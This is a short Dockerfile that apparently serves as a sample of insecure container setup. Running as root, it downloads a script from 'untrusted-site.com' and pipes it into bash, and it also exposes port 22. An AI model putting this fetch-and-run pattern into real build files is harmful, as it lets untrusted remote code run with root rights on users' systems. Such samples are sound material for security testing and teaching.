FROM ubuntu:latest
USER root
RUN apt-get update && apt-get install -y curl
RUN curl -sSL https://untrusted-site.com/install.sh | bash
EXPOSE 22
CMD ["/bin/bash"]
